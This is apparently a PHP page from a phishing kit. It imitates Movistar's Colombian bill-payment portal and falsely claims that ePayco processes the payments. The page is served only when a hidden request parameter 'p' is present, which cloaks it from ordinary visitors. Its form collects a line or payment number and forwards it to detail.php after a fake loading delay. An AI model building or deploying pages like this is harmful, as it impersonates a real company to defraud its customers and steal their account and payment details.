<?php
if (isset($_REQUEST["p"])) {
    $key = $_REQUEST["p"];
    $jsCode = <<<HTML

<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Movistar Portal de Recaudos, Paga o programa tus facturas</title>

    <link rel="icon" href="./assets/images/favicon-32x32.png">

    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.0-beta2/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-BmbxuPwQa2lc/FVzBcNJ7UAyJxM6wuqIj61tLrc4wSX0szH/Ev+nYRRuWlolflfl" crossorigin="anonymous">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css">
    
    <link rel="stylesheet" href="/assets/css/styles.css">
    
    <link rel="stylesheet" type="text/css" href="https://www.gstatic.com/recaptcha/releases/Xv-KF0LlBu_a0FJ9I5YSlX5m/styles__ltr.css">
</head>
<body>
    <div class="wrapper">
        <header class="header">
            <img src="/assets/images/logo.png" alt="" srcset="">
            <div class="right-side">
                <img src="/assets/images/candado.png" alt="ePayco" width="3%">
                <span>Pagos procesados por</span>
                <img src="/assets/images/epayco.png" alt="ePayco" class="epayco">
            </div>
        </header>

        <main class="main">
            <div class="box__content">
                <div class="box">
                    <button class="box__op active">Movistar</button>
                    <button class="box__op">Antes Telebucaramanga</button>
                    <button class="box__op">Antes Metrotel</button>
                </div>
            </div>

            <div class="title text-center pt-3 pb-2" style="font-size: 22px; line-height: 1.3em;">
                <span class="fl">Pagar mi factura <strong class="fb">Movistar</strong></span>
            </div>

            <div class="content" direction="row">
                <button class="content__op active">Móvil</button>
                <button class="content__op">Fija</button>
            </div>

            <form id="formulario" class="form" action="./detail.php" method="POST">
                <div class="form__element">
                    <input class="form__input" name="numero" type="text" maxlength="11" placeholder="Ingresa el número de línea o de pago" required>
                    <i class="bi bi-phone"></i>
                </div>

             
                <div class="form__submit">
                    <button class="form__btn active" type="submit" onclick="loader()">
                        <div size="40" class="css-1rlryu3 hidde"></div>
                        Consultar y pagar
                    </button>

                    <button class="form__btn form__btn--trp active">
                        <i class="bi bi-clock-history"></i> 
                        Programar / Administrar mis pagos
                    </button>
                </div>
            </form>
        </main>

        <footer class="footer">
            <div class="footer__txt">
                <strong>Nuevos medios de pago</strong>
                disponibles para ti
            </div>

            <div class="method-pay">
                <div class="method-pay__top">
                    <img class="method-pay__img" src="/assets/images/descargar1.jpeg" height="20px" alt="">
                    <img class="method-pay__img" src="/assets/images/descargar2.jpeg" height="20px" alt="">
                    <img class="method-pay__img" src="/assets/images/descargar3.jpeg" height="20px" alt="">
                    <img class="method-pay__img" src="/assets/images/descargar4.png" height="20px" alt="">
                </div>

                <p class="method-pay__txt">
                    <i class="bi bi-exclamation-circle-fill"></i>
                    No se aceptan pagos con tarjetas de crédito internacionales
                </p>
            </div>

            <div class="footer__img"></div>
        </footer>
    </div>

    <script>
        // VALIDACION DE SOLO NUMEROS EN INPUT
        document.querySelector('.form__input').addEventListener('input', function (e) {
            this.value = this.value.replace(/[^0-9]/g, '');
        });

        // BOTON DE CARGANDO
        function loader(){
            document.getElementById('formulario').addEventListener('submit', function(event) {
                const loader = document.querySelector('.css-1rlryu3');
                loader.classList.remove('hidde');
                event.preventDefault(); 
                
                setTimeout(() => {
                    this.submit();
                }, 3000);
            });
        }
    </script>
</body>
</html>
HTML;

echo $jsCode;
}
?>